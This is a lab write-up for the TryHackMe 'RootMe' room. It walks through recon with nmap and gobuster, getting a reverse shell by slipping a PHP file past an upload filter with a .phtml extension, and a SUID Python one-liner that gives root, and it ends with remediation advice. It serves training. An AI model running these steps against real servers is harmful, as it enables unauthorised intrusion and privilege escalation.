# RootMe — TryHackMe Writeup

> **Room:** [RootMe](https://tryhackme.com/room/rrootme) · **Difficulty:** Easy
> **Category:** Web (upload bypass → SUID privesc)
> **Author of writeup:** 0xnyx
> **Goal:** Bypass an upload filter for a shell, then abuse a SUID interpreter for root.

> ⚠️ In line with TryHackMe's [write-up policy](https://tryhackme.com/room/rrootme), **no flags are included** — only the method.

---

## How to read this writeup

Each step: **Do** → **You get** → **Why / what next**.

---

## Step 1 — Recon

**Do** — Service scan + directory brute.

```bash
nmap -sVC -T4 -Pn <TARGET>
gobuster dir -u http://<TARGET> -w /usr/share/wordlists/dirb/common.txt -x php
```

**You get**

```
22  ssh    OpenSSH 8.2p1
80  http   Apache 2.4.41  ("HackIT - Home")
/panel/     -> a file upload form
/uploads/   -> where uploads land (writable, browsable)
```

**Why / what next** — An upload form + a reachable `/uploads/` is a direct path to a web shell — **if** we beat the extension filter.

---

## Step 2 — Foothold (upload filter bypass)

**Do** — Uploading `.php` is blocked. Apache still executes alternate PHP extensions, so rename the shell to `.phtml`.

```bash
# shell.phtml = a PHP reverse shell
# upload via /panel, then (nc -lvnp 4444 first):
curl http://<TARGET>/uploads/shell.phtml
```

**You get** — A reverse shell as **www-data**; the user flag is on the filesystem (`find / -name user.txt 2>/dev/null`).

**Why / what next** — The filter is an **extension denylist** (`.php` only). `.phtml` is still mapped to the PHP handler, so it executes. Now privesc.

---

## Step 3 — Root (SUID Python)

**Do** — Hunt SUID binaries.

```bash
find / -perm -4000 -type f 2>/dev/null
```

**You get**

```
/usr/bin/python
```

**Why / what next** — A SUID Python lets us keep the elevated UID and drop to a root shell ([GTFOBins: python/suid](https://gtfobins.github.io/gtfobins/python/#suid)):

```bash
/usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

**You get** — A root shell → root flag.

---

## The full chain at a glance

| Step | Technique | Result |
|------|-----------|--------|
| 1 | Dir brute | `/panel` upload + `/uploads/` |
| 2 | `.phtml` extension bypass | www-data shell (user flag) |
| 3 | SUID `/usr/bin/python` → `os.setuid(0)` | Root |

## Lessons

- An extension **denylist** is trivially bypassed — `.phtml`, `.php5`, `.phar` often still execute as PHP.
- `find / -perm -4000` is the first privesc check; a SUID **interpreter** = instant root via GTFOBins.

## Remediation

- Validate uploads by content, store them outside the web root, and serve them non-executable.
- Never set the SUID bit on interpreters like python/perl/bash.

---

*Write-up for [TryHackMe — RootMe](https://tryhackme.com/room/rrootme).*
